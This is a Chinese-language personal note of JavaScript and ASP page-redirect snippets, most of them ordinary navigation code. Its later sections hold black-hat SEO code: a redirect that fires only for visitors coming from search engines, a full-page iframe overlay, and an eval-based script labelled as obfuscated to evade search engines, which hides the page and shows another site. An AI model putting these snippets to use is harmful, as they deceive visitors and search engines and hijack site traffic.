---
last_time: 2020.04.03
tag: 有道云
---

# js跳转页面

## 常规的JS页面跳转代码

1、在原来的窗体中直接跳转用

```js
<script type="text/javascript">
　　window.location.href="你所要跳转的页面";
</script>
```

2、在新窗体中打开页面用

```js
<script type="text/javascript">
　　window.open('你所要跳转的页面');
</script>
```

3、JS页面跳转参数的注解

```js
<SCRIPT LANGUAGE="javascript">
　　<!--
　　window.open ('page.html', 'newwindow', 'height=100, width=400, top=0,left=0, toolbar=no, menubar=no, scrollbars=no, resizable=no,location=no, status=no')
　　//写成一行
　　-->
</SCRIPT>
```

参数解释：

`<SCRIPT LANGUAGE="javascript">` js脚本开始；

　　window.open 弹出新窗口的命令；

　　'page.html' 弹出窗口的文件名；

　　'newwindow' 弹出窗口的名字（不是文件名），非必须，可用空'代替；

　　height=100 窗口高度；

　　width=500 窗口宽度；

　　top=0 窗口距离屏幕上方的象素值；

　　left=0 窗口距离屏幕左侧的象素值。

## 跳转指定页面的JS代码

第1种

```js
<script language="javascript" type="text/javascript">
　　window.location.href="login.jsp?backurl="+window.location.href;
</script>
```

第2种

```js
<script language="javascript">
　　alert("返回");
　　window.history.back(-1);
</script>
```

第3种

```js
<script language="javascript">
　　window.navigate("top.jsp");
</script>
```

第4种

```js
<script language="JavaScript">
　　self.location=’top.htm’;
</script>
```

第5种

```js
<script language="javascript">
　　alert("非法访问！");
　　top.location=’xx.jsp’;
</script>
```

## 页面停留指定时间再跳转（如3秒）

```js
<script type="text/javascript">
　　function jumurl(){
    　　window.location.href = 'http://www.mahaixiang.cn/';
　　}
　　setTimeout(jumurl,3000);
</script>
```

## 根据访客来源跳转的JS代码

1、JS判断来路代码

此段代码主要用于百度谷歌点击进入跳转，直接打开网站不跳转：

```js
<script LANGUAGE="Javascript">
　　var s=document.referrer
　　if(s.indexOf("google")>0 || s.indexOf("baidu")>0 || s.indexOf("yahoo")>0 )
　　location.href="http://www.mahaixiang.cn/";
</script>
```

2、JS直接跳转代码

```js
<script LANGUAGE="Javascript">
　　location.href="http://www.mahaixiang.cn/";
</script>
```

3、ASP跳转代码判断来路

```js
<%
　　if instr(Request.ServerVariables("http_referer"),"www.baidu.com")>0 then
　　response.redirect("http://www.mahaixiang.cn/")
　　end if
%>
```

4、ASP直接跳转的

```js
<%
　　response.redirect("http://www.mahaixiang.cn/")
%>
```

## 广告与网站页面一起的JS代码

1、上面是广告下面是站群的代码

```js
document.writeln("<iframe scrolling='no' frameborder='0' marginheight='0' marginwidth='0' width='100%' height='5000' allowTransparency src=http://www.mahaixiang.cn/></iframe>");
```

2、全部覆盖的代码

```js
document.write("</iframe><iframe src='http://www.mahaixiang.cn/' rel='nofollow' scrolling='no' frameborder='0' width='100%' height='2000'>");
```

3、混淆防止搜索引擎被查的js调用

具体的展示上面是广告下面是站群的代码：

```js
var ss = '<center id="showcloneshengxiaon"><ifr'+'ame scrolling="no" marginheight=0 marginwidth=0 frameborder="0" width="100%" width="14'+'00" height="63'+'50" src="ht'+'tp://'+'ww'+'w.hx'+'zhan'+'qun.c'+'om/"></iframe></center>';
　　eval("do"+"cu"+"ment.wr"+"ite('"+ss+"');");
　　try{
　　 setInterval(function(){
　　 try{
　　 document.getElementById("div"+"All").style.display="no"+"ne";
　　 }catch(e){}
　　 for(var i=0;i<document.body.children.length;i++){
try{
var tagname = document.body.children[i].tagName;
var myid = document.body.children[i].id;
if(myid!="iconDiv1" && myid!="showcloneshengxiaon"){
// if(tagname!="center"){
document.body.children[i].style.display="non"+"e";
//}
}
}catch(e){}
　　 }
　　 },100);
　　}catch(e){}
```

## 页面跳出框架

```js
<script type="text/javascript">
　　top.location.href='http://www.mahaixiang.cn/';
</script>
```

## 返回上一页

```js
<script type="text/javascript">
　　window.history.back(-1);
</script>
```



